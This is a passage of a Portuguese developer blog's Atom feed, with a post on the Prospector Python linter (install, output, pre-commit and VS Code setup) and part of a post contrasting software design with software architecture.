&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="web"></category><category term="apis"></category><category term="python"></category><category term="django"></category><category term="rest"></category><category term="drf"></category><category term="eu-me-rendo"></category></entry><entry><title>Assegure a qualidade do seu código Python - Prospector</title><link href="https://klauslaube.com.br/2020/01/21/assegure-qualidade-seu-codigo-python-prospector.html" rel="alternate"></link><published>2020-01-21T16:15:00-03:00</published><updated>2020-01-21T16:15:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-01-21:/2020/01/21/assegure-qualidade-seu-codigo-python-prospector.html</id><summary type="html">&lt;p&gt;Mais um ano, mais um &lt;em&gt;post&lt;/em&gt; sobre &lt;a href="https://klauslaube.com.br/tag/qualidade.html" title="Leia mais sobre qualidade"&gt;ferramentas de qualidade de código&lt;/a&gt;. Opções não faltam quando o assunto é &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, e elas são dos mais variados fins e complexidade. Com tanta opção, não seria interessante ter "um anel para a todos governar"?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Tanto é interessante que um utilitário vem fazendo …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Mais um ano, mais um &lt;em&gt;post&lt;/em&gt; sobre &lt;a href="https://klauslaube.com.br/tag/qualidade.html" title="Leia mais sobre qualidade"&gt;ferramentas de qualidade de código&lt;/a&gt;. Opções não faltam quando o assunto é &lt;a href="https://klauslaube.com.br/tag/python.html" title="Leia mais sobre Python"&gt;&lt;em&gt;Python&lt;/em&gt;&lt;/a&gt;, e elas são dos mais variados fins e complexidade. Com tanta opção, não seria interessante ter "um anel para a todos governar"?&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Tanto é interessante que um utilitário vem fazendo parte do &lt;em&gt;toolbelt&lt;/em&gt; dos desenvolvedores &lt;em&gt;Python&lt;/em&gt; nos últimos tempos justamente por desempenhar esse papel. Estamos falando, claro, do &lt;a href="https://prospector.readthedocs.io/en/master/" title="Leia a documentação oficial"&gt;&lt;em&gt;Prospector&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;One ring to rule them all&lt;/h2&gt;
&lt;p&gt;O &lt;em&gt;Prospector&lt;/em&gt; é uma ferramenta &lt;a href="https://github.com/PyCQA/prospector/blob/master/LICENSE" title="Confira mais no repositório do projeto"&gt;livre&lt;/a&gt;, que analisa código &lt;em&gt;Python&lt;/em&gt; e retorna informações sobre potenciais problemas, erros de convenção de código, alertas sobre complexidade, etc.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/lsp-one-ring.jpeg" width="740" height="493" title="Sauron faz um anel para juntar a todos. Bem parecido com a ideia do prospector (lego-lord-of-the-rings.wikia.com)" alt="Sauron faz um anel para juntar a todos. Bem parecido com a ideia do prospector (lego-lord-of-the-rings.wikia.com)"&gt;&lt;/p&gt;
&lt;p&gt;Ela agrega a funcionalidade de outras ferramentas de análise, como &lt;a href="https://klauslaube.com.br/2011/09/06/assegura-a-qualidade-de-codigo-python-pylint.html" title="Leia mais sobre o Pylint"&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://klauslaube.com.br/2011/08/26/assegure-qualidade-seu-codigo-python-pep.html" title="Leia mais sobre PEP8"&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/a&gt;, e disponibiliza algumas configurações padrões, permitindo assim um bom balanço entre cobertura x configuração.&lt;/p&gt;
&lt;p&gt;O "lema" do &lt;em&gt;Prospector&lt;/em&gt; é ser "out of the box". Segundo a &lt;a href="https://prospector.readthedocs.io/en/master/" title="Leia mais na documentação do Prospector"&gt;documentação oficial&lt;/a&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A common complaint of other Python analysis tools is that it takes a long time to filter through which errors are relevant or interesting to your own coding style. Prospector provides some default profiles, which hopefully will provide a good starting point and will be useful straight away, and adapts the output depending on the libraries your project uses.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2&gt;No terminal&lt;/h2&gt;
&lt;p&gt;Para começar, precisamos instalar a ferramenta:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ pip install prospector
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Por padrão o &lt;em&gt;Prospector&lt;/em&gt; utiliza os seguintes utilitários "under the hood":&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;Pylint&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pep8&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://klauslaube.com.br/2011/10/02/assegure-qualidade-seu-codigo-python-pyflakes.html" title="Leia mais sobre o Pyflakes"&gt;&lt;em&gt;pyflakes&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;mccabe&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://klauslaube.com.br/2019/12/18/assegure-qualidade-seu-codigo-python-dodgy.html" title="Leia mais sobre o Dodgy"&gt;&lt;em&gt;dodgy&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;pydocstyle&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Mas alguns extras (como &lt;em&gt;mypy&lt;/em&gt;) também estão disponíveis para instalação. Confira a &lt;a href="https://prospector.readthedocs.io/en/master/supported_tools.html" title="Supported Tools"&gt;lista completa de ferramentas suportadas&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Ao executá-lo, ele apontará possíveis problemas em seu projeto:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ prospector

Messages
========

my_app/views.py
  Line: 1
    pylint: unused-import / Unused render imported from django.shortcuts

manage.py
  Line: 10
    pylint: import-outside-toplevel / Import outside toplevel (django.core.management) (col 8)

my_project/settings.py
  Line: 23
    dodgy: secret / Possible hardcoded secret key

my_second_app/views.py
  Line: 1
    pylint: unused-import / Unused render imported from django.shortcuts



Check Information
=================
         Started: 2020-01-21 11:06:04.832118
        Finished: 2020-01-21 11:06:07.455090
      Time Taken: 2.62 seconds
       Formatter: grouped
        Profiles: default, no_doc_warnings, no_test_warnings, strictness_medium, strictness_high, strictness_veryhigh, no_member_warnings
      Strictness: None
  Libraries Used: django
       Tools Run: dodgy, mccabe, pep8, profile-validator, pyflakes, pylint
  Messages Found: 4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ainda é possível aumentar o nível de rigorosidade:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ prospector --strictness veryhigh
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Utilizando-o com o &lt;a href="https://pre-commit.com/" title="pre-commit hooks"&gt;&lt;em&gt;pre-commit&lt;/em&gt;&lt;/a&gt;, tudo fica ainda mais dinâmico:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;repo&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;git://github.com/guykisel/prospector-mirror&lt;/span&gt;
  &lt;span class="nt"&gt;rev&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="c1"&gt;# Use the sha / tag you want to point at&lt;/span&gt;
  &lt;span class="nt"&gt;hooks&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;id&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;prospector&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;No VS Code&lt;/h2&gt;
&lt;p&gt;Admito que conheci o &lt;em&gt;Prospector&lt;/em&gt; por causa do &lt;a href="https://klauslaube.com.br/2018/06/04/eu-me-rendo-vscode.html" title="Eu me rendi ao VS Code"&gt;&lt;em&gt;VS Code&lt;/em&gt;&lt;/a&gt;, e utilizá-lo com o editor é tão simples quanto o seu uso via linha de comando. Basta adicionar ao seu &lt;code&gt;settings.json&lt;/code&gt; as seguintes diretivas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;python.linting.enabled&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
  &lt;span class="nt"&gt;&amp;quot;python.linting.prospectorEnabled&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;E após o editor resolver as dependências, ele passa a funcionar quase que magicamente.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/prospector-example.png" width="740" height="236" title="Exemplo de uso do Prospector + Dodgy + VS Code" alt="Exemplo de uso do Prospector + Dodgy + VS Code"&gt;&lt;/p&gt;
&lt;h2&gt;Considerações finais&lt;/h2&gt;
&lt;p&gt;Se você já está cansado de configurar diferentes ferramentas de &lt;em&gt;linting&lt;/em&gt; &lt;em&gt;Python&lt;/em&gt;, o &lt;em&gt;Prospector&lt;/em&gt; pode ser um bom utilitário para manter por perto.&lt;/p&gt;
&lt;p&gt;Tenho problemas com a "verbosidade" dele, mas acho que ele funciona bem com editores como o &lt;em&gt;VS Code&lt;/em&gt; (por exemplo). Se você quiser ser altamente criterioso em relação ao seu código, vale muito a pena testá-lo em seu processo de &lt;em&gt;pre-commit&lt;/em&gt; e durante o &lt;em&gt;build&lt;/em&gt; no &lt;em&gt;CI&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Até a próxima.&lt;/p&gt;
&lt;h2&gt;Referências&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://github.com/PyCQA/prospector/"&gt;Github - prospector&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content><category term="desenvolvimento"></category><category term="ambiente-de-desenvolvimento"></category><category term="python"></category><category term="qualidade"></category><category term="prospector"></category></entry><entry><title>Software Design x Software Architecture</title><link href="https://klauslaube.com.br/2020/01/07/software-design-software-architecture.html" rel="alternate"></link><published>2020-01-07T16:00:00-03:00</published><updated>2020-01-07T16:00:00-03:00</updated><author><name>Klaus Peter Laube</name></author><id>tag:klauslaube.com.br,2020-01-07:/2020/01/07/software-design-software-architecture.html</id><summary type="html">&lt;p&gt;Uma das características que eu mais gosto no &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre ágil"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;
é o conhecimento compartilhado nos times. E eu não falo apenas dos desenvolvedores generalistas,
falo também das responsabilidades que em um modelo mais parecido com o
&lt;em&gt;waterfall&lt;/em&gt; seriam atribuídas a um indivíduo apenas, mas que no ágil são diluídas na equipe …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Uma das características que eu mais gosto no &lt;a href="https://klauslaube.com.br/tag/agile.html" title="Leia mais sobre ágil"&gt;&lt;em&gt;agile&lt;/em&gt;&lt;/a&gt;
é o conhecimento compartilhado nos times. E eu não falo apenas dos desenvolvedores generalistas,
falo também das responsabilidades que em um modelo mais parecido com o
&lt;em&gt;waterfall&lt;/em&gt; seriam atribuídas a um indivíduo apenas, mas que no ágil são diluídas na equipe.&lt;/p&gt;
&lt;!-- PELICAN_END_SUMMARY --&gt;

&lt;p&gt;Como o time geralmente trabalha em um escopo focado,
com quem fica a responsabilidade da arquitetura de toda uma solução?
Quem pensa no longo prazo? Na comunicação entre serviços e componentes?&lt;/p&gt;
&lt;p&gt;Até onde vai a responsabilidade de &lt;em&gt;design&lt;/em&gt; e começa a de arquitetura?&lt;/p&gt;
&lt;h2&gt;Definição&lt;/h2&gt;
&lt;p&gt;Fundamentalmente, há distinção entre as disciplinas de &lt;em&gt;software design&lt;/em&gt; e
&lt;em&gt;software architecture&lt;/em&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Software design&lt;/strong&gt;: Foca nos aspectos mais "baixo nível" do sistema;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Software architecture&lt;/strong&gt;: Olha para aspectos mais "alto nível" do sistema.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/matrix-filosofia.jpg" width="733" height="417" title="Calma! Não vamos misturar filosofia e programação. Mas piadas com o The Matrix estão liberadas (rottenmelon.tripod.com)" alt="Calma! Não vamos misturar filosofia e programação. Mas piadas com o The Matrix estão liberadas (rottenmelon.tripod.com)"&gt;&lt;/p&gt;
&lt;p&gt;Mesmo assim, não é raro misturarmos as duas responsabilidades e atribuí-las a um papel só. O que não é
necessariamente um problema, já que as disciplinas podem ser encaradas como o mesmo problema
em escalas diferentes.&lt;/p&gt;
&lt;h2&gt;Software Architecture&lt;/h2&gt;
&lt;p&gt;Definir arquitetura de &lt;em&gt;software&lt;/em&gt; é um desafio. O &lt;a href="https://pt.wikipedia.org/wiki/Arquitetura_de_software" title="Arquitetura de Software no Wikipedia"&gt;&lt;em&gt;Wikipedia&lt;/em&gt;&lt;/a&gt; define o termo da seguinte forma:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;(...) consiste na definição dos componentes de software, suas propriedades externas, e seus relacionamentos com outros softwares. O termo também se refere à documentação da arquitetura de software do sistema. A documentação da arquitetura do software facilita: a comunicação entre os stakeholders, registra as decisões iniciais acerca do projeto de alto-nível, e permite o reúso do projeto dos componentes e padrões entre projetos.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Eu me dou conta que estou nos "domínios" da arquitetura de &lt;em&gt;software&lt;/em&gt; quando estou debatendo as "ilities" de um projeto. Portanto, a definição do &lt;a href="https://codeburst.io/software-architecture-the-difference-between-architecture-and-design-7936abdd5830" title="Software Architecture - The Difference Between Architecture and Design"&gt;&lt;em&gt;Codeburst&lt;/em&gt;&lt;/a&gt; casa melhor com a minha compreensão sobre o assunto:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In simple words, software architecture is the process of converting software characteristics such as flexibility, scalability, feasibility, reusability, and security into a structured solution that meets the technical and the business expectations. This definition leads us to ask about the characteristics of a software that can affect a software architecture design. There is a long list of characteristics which mainly represent the business or the operational requirements, in addition to the technical requirements.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Portanto, quando há um requisito de produto que demanda rápida adaptação do modelo de negócios, pois a empresa ainda está procurando o seu &lt;em&gt;market fit&lt;/em&gt;, a solução poderia ser &lt;strong&gt;extensível&lt;/strong&gt;, &lt;strong&gt;modular&lt;/strong&gt; e de &lt;strong&gt;fácil alteração&lt;/strong&gt;. Essas qualidades possivelmente não se encaixarão em um projeto de perfil mais conservador, como um sistema bancário, por exemplo, que teria como uma provável &lt;em&gt;ility&lt;/em&gt; a &lt;strong&gt;segurança&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/the-matrix-the-keymaker.jpg" width="734" height="487" title="Quem tem que lidar com certificados no cotidiano reza para ter um Keymaker na empresa (reddit.com)" alt="Quem tem que lidar com certificados no cotidiano reza para ter um Keymaker na empresa (reddit.com)"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/List_of_system_quality_attributes" title="Veja a lista no Wikipedia"&gt;Confira uma lista completa de &lt;em&gt;system quality attributes&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Esses aspectos são de responsabilidade do arquiteto de &lt;em&gt;software&lt;/em&gt; de levantar, debater, e de setar como &lt;em&gt;boundaries&lt;/em&gt; do projeto em questão. Sem dúvida elas passam a influenciar o &lt;em&gt;design&lt;/em&gt; dos componentes que serão construídos durante o tempo de projeto.&lt;/p&gt;
&lt;h3&gt;O arquiteto&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;Kostadis Roussos&lt;/em&gt;, no breve (mas excelente) &lt;a href="https://medium.com/@kostadisroussos/21-architecturalist-papers-always-be-right-right-now-1552af8dc330" title="Leia na íntegra no Medium"&gt;"21 architecturalist papers: always be right, right now."&lt;/a&gt; define o papel do arquiteto salientando o seguinte atributo:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;An architect has visions of the future, and those visions are often years away from delivery, and worse, even more years away from solving any of the immediate problems engineering management has.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Segundo &lt;em&gt;Kostadis&lt;/em&gt;, o arquiteto precisa guiar o projeto para a direção correta. Dentro do contexto ágil, sabemos que essa direção pode mudar, mas ainda assim o arquiteto deve ser capaz de se adaptar a essa mudança, mudar o curso, e continuar fazendo com que o projeto siga o caminho certo.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/the-architect.png" width="559" height="357" title="Não é desse arquiteto que estamos falando (quora.com)" alt="Não é desse arquiteto que estamos falando (quora.com)"&gt;&lt;/p&gt;
&lt;p&gt;Além de ser "high-level o suficiente" para ter a visão do todo, o arquiteto ainda é responsável por gerenciar expectativas de gerentes, diretores, &lt;em&gt;product owners&lt;/em&gt;, e até mesmo dos próprios engenheiros. E em relação à engenharia a balança pode ser ainda mais frágil, uma vez que ele deve ser "distante o suficiente" para que um &lt;em&gt;gap&lt;/em&gt; criativo seja formado, e que engenharia tenha a oportunidade de inovar.&lt;/p&gt;
&lt;p&gt;Então chegamos ao melhor parágrafo do texto de &lt;em&gt;Roussos&lt;/em&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;In short, you need to be right, and high-level enough that you can’t be wrong, but if that’s where you end, you fail.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;em&gt;Chris Richardson&lt;/em&gt;, no livro &lt;a href="https://www.goodreads.com/book/show/34372564-microservice-patterns?ac=1&amp;amp;from_search=true&amp;amp;qid=cFhoy0HIPb&amp;amp;rank=1" title="Veja no Goodreads"&gt;&lt;em&gt;Microservices Patterns&lt;/em&gt;&lt;/a&gt;, estressa um pouco mais sobre a importância desse papel:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Architecture is important because it enables an application to satisfy the second category of requirements: its quality of service requirements. These are also known as quality attributes and are the so-called -ilities. The quality of service requirements define the runtime qualities such as scalability and reliability. They also define development time qualities including maintainability, testability, and deployability. The architecture you choose for your application determines how well it meets these quality requirements.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Padrões e ferramentas&lt;/h3&gt;
&lt;p&gt;Encontramos alguns estilos já estabelecidos e bem conhecidos de arquiteturas que resolvem combinações de qualidades, como o caso do &lt;a href="https://microservices.io/patterns/monolithic.html" title="Leia mais no microservices.io"&gt;&lt;em&gt;Monolithic Architecture&lt;/em&gt;&lt;/a&gt;, &lt;a href="https://docs.microsoft.com/en-us/azure/architecture/guide/architecture-styles/event-driven" title="Leia mais na documentação do Azure"&gt;&lt;em&gt;Event-Driven (Implicit Invocation) Architecture&lt;/em&gt;&lt;/a&gt;, e talvez o mais "hypado", &lt;a href="https://www.infoq.com/br/news/2014/07/introducing-microservices/" title="Leia a introdução no InfoQ"&gt;&lt;em&gt;Microservices Architecture&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Eles podem fazer uso de um ou mais padrões de arquitetura, como por exemplo, a arquitetura monolítica pode ser composta pelos padrões &lt;a href="https://en.wikipedia.org/wiki/Multitier_architecture" title="Leia na íntegra no Wikipedia"&gt;&lt;em&gt;n-tier&lt;/em&gt;&lt;/a&gt; e &lt;a href="https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93controller" title="LEia na íntegra no Wikipedia"&gt;&lt;em&gt;model-view-controller&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/the-matrix-architect-neo.jpg" width="740" height="416" title="Não é só de terno vis-a-vis que vive um arquiteto (lascimmiapensa.com)" alt="Não é só de terno vis-a-vis que vive um arquiteto (lascimmiapensa.com)"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://en.wikipedia.org/wiki/List_of_software_architecture_styles_and_patterns" title="List of software architecture styles and patterns"&gt;Lista de estilos e padrões de arquitetura de &lt;em&gt;software&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Algumas ferramentas estão disponíveis para auxiliar o arquiteto na tarefa de modelar a solução, bem como de expor determinados detalhes para diferentes tipos de &lt;em&gt;stakeholders&lt;/em&gt;. Talvez a &lt;em&gt;top of mind&lt;/em&gt; seja a própria &lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/modeling-software-architecture-with-package/" title="UML: Modeling Software Architecture with Packages"&gt;&lt;em&gt;UML&lt;/em&gt;&lt;/a&gt;. Outra opção é o &lt;em&gt;4 + 1 architectural view model&lt;/em&gt;, que é uma espécie de &lt;em&gt;framework&lt;/em&gt; que auxilia na separação de diferentes aspectos do sistema em diferentes visões (que podem inclusive utilizar artefatos da &lt;em&gt;UML&lt;/em&gt; para os seus propósitos).&lt;/p&gt;
&lt;p&gt;As visões são:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Logical view:&lt;/strong&gt; Preocupa-se com a funcionalidade que o sistema provê para o usuário final. Utiliza &lt;a href="https://en.wikipedia.org/wiki/Class_diagram" title="Class diagram"&gt;diagramas de classe&lt;/a&gt; e de &lt;a href="https://en.wikipedia.org/wiki/State_diagram" title="State diagram"&gt;estado&lt;/a&gt; da &lt;em&gt;UML&lt;/em&gt;, e é relevante para desenvolvedores;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Process view:&lt;/strong&gt; Descreve processos concorrentes dentro de um sistema. Pode englobar requisitos não funcionais, como performance e disponibilidade, e é representado através do &lt;a href="https://www.tutorialspoint.com/uml/uml_activity_diagram.htm" title="Activity diagram"&gt;diagrama de atividade&lt;/a&gt; da &lt;em&gt;UML&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Development view:&lt;/strong&gt; Foca na ótica do programador, e descreve componentes do sistema. Utiliza o diagrama de &lt;a href="https://en.wikipedia.org/wiki/Component_diagram" title="Component diagram"&gt;componente&lt;/a&gt; e de &lt;a href="https://en.wikipedia.org/wiki/Package_diagram" title="Package diagram"&gt;pacote&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Physical view:&lt;/strong&gt; Descreve a topologia do sistema de uma perspectiva física. Por exemplo, quantos nós são utilizados, o que é "deployado" em cada nó, como escala, etc. Utiliza o &lt;a href="https://en.wikipedia.org/wiki/Deployment_diagram" title="Deployment diagram"&gt;diagrama de &lt;em&gt;deploy&lt;/em&gt;&lt;/a&gt; da &lt;em&gt;UML&lt;/em&gt;;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Use case view:&lt;/strong&gt; Descreve a funcionalidade do sistema da perspectiva do mundo exterior, ou seja, ilustra o que o sistema deveria fazer através de cenários, que são determinantes para identificar elementos da arquitetura e validar &lt;em&gt;design&lt;/em&gt;. Utiliza casos de uso da &lt;em&gt;UML&lt;/em&gt;, e todas as outras visões utilizam dessa (e de seus cenários) para guiá-las.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href="https://www.coursera.org/lecture/software-architecture/3-1-2-kruchtens-4-1-model-view-z65ZO" title="Kruchten's 4 + 1 Model View"&gt;Assista à introdução ao &lt;em&gt;4 + 1&lt;/em&gt; no Coursera&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Para finalizar, outra prática bem interessante é a escrita de &lt;a href="https://etutorials.org/Programming/Software+architecture+in+practice,+second+edition/Part+Two+Creating+an+Architecture/Chapter+4.+Understanding+Quality+Attributes/4.3+System+Quality+Attributes/" title="Leia o artigo na íntegra"&gt;&lt;em&gt;Quality Attribute Scenarios&lt;/em&gt;&lt;/a&gt;, que são requisitos não funcionais, específicos para mensurar a qualidade da sua solução para problemas específicos.&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/example-quality-attributes.png" width="740" height="284" title="Exemplo de Quality Attributes revisados" alt="Exemplo de Quality Attributes revisados"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://www.coursera.org/lecture/software-architecture/3-3-1-quality-attributes-xAwkW" title="Quality Attributes"&gt;Veja mais na excelente aula do &lt;em&gt;Coursera&lt;/em&gt; sobre &lt;em&gt;Quality Attributes&lt;/em&gt;&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Software Design&lt;/h2&gt;
&lt;p&gt;O &lt;a href="https://www.coursera.org/learn/object-oriented-design/" title="Object-Oriented Design no Coursera"&gt;curso &lt;em&gt;Object-Oriented Design&lt;/em&gt;&lt;/a&gt;,
da Universidade de Alberta, define &lt;em&gt;software design&lt;/em&gt; da seguinte forma:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;The process of planning a software solution, taking the requirements and constraints into account.
Divided into higher-level conceptual design and more specific technical design.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;O foco está em pensar na solução para um problema específico, projetando detalhes de um determinado
componente e suas responsabilidades, e utilizando de artefatos que ajudem no debate
com a camada mais próxima de negócios (&lt;em&gt;high-level&lt;/em&gt;, mais conceitual) e mais próxima de implementação
(&lt;em&gt;low-level&lt;/em&gt;, técnica).&lt;/p&gt;
&lt;p&gt;&lt;img class="align-center-keep-size" src="/images/blog/the-matrix-mouser.jpg" width="740" height="386" title="Um vivo para o designer da Mulher de Vermelho (ballardwachowskiproject.wordpress.com)" alt="Um vivo para o designer da Mulher de Vermelho (ballardwachowskiproject.wordpress.com)"&gt;&lt;/p&gt;
&lt;p&gt;Esse passo tem presença constante no início das iterações no modelo iterativo/incremental, e pode ser desempenhado
por diferentes papéis dentro de um time (naturalmente, com envolvimento dos desenvolvedores).&lt;/p&gt;
&lt;h3&gt;Design conceitual&lt;/h3&gt;
&lt;p&gt;Partimos do princípio que tudo origina-se de um requisito:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Quero ver a minha lista de músicas favoritas.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Requisitos podem ser "funcionais" (como o exemplo acima), ou "não funcionais" (como o exemplo de "ilities" da seção anterior).
Quando falamos de &lt;em&gt;design&lt;/em&gt; conceitual, geralmente nos referimos ao primeiro tipo, e através de discussões mais próximas do problema exploramos soluções.&lt;/p&gt;
&lt;p&gt;Nessa etapa é comum lidar com ferramentas, preferencialmente de baixo custo e fácil alteração, que consigam
"traduzir" a solução sendo discutida em artefatos visuais, como por exemplo:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Diagramas de alto nível:&lt;/strong&gt; Para exemplificar relacionamentos entre o usuário, interface e demais componentes (não técnico);&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Wireframes:&lt;/strong&gt; Para discutir elementos em uma interface de usuário;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Protótipos:&lt;/strong&gt; Para demonstrar comportamentos;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Mockups:&lt;/strong&gt; Para refletir decisões de &lt;em&gt;design&lt;/em&gt; como cores, &lt;em&gt;layouts&lt;/em&gt;, tipografia, interações, etc.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Uma outra forma de debatermos requisitos sob uma ótica conceitual é através da construção de &lt;em&gt;user stories&lt;/em&gt;. Com elas,
podemos tomar algumas liberdades para sermos mais específicos sobre as necessidades e expectativas que precisam ser atendidas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Eu como um usuário autenticado,
Quero poder visualizar as minhas músicas favoritas,
Para que eu consiga ouví-las com facilidade e maior frequência.
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Design técnico&lt;/h3&gt;
&lt;p&gt;Com o &lt;em&gt;design&lt;/em&gt; técnico, estamos enfim discutindo aspectos voltados à "solução prática". Mas nem por isso deixamos de ser expostos a abstrações, como por exemplo, se você estiver utilizando &lt;a href="https://klauslaube.com.br/tag/oop.html" title="Leia mais sobre Orientação a Objetos"&gt;&lt;em&gt;OOP&lt;/em&gt;&lt;/a&gt;:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.lucidchart.com/pages/pt/o-que-e-diagrama-entidade-relacionamento" title="O que é um diagrama de entidade e relacionamento?"&gt;Diagrama de Entidade e Relacionamento (ER)&lt;/a&gt;: Caso você esteja partindo da ótica do seu banco de dados;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.visual-paradigm.com/guide/uml-unified-modeling-language/what-is-uml/" title="What is Unified Modeling Language?"&gt;&lt;em&gt;UML&lt;/em&gt;&lt;/a&gt;: Caso você queira esquematizar relacionamentos e ciclo de vida dos seus componentes;&lt;/li&gt;
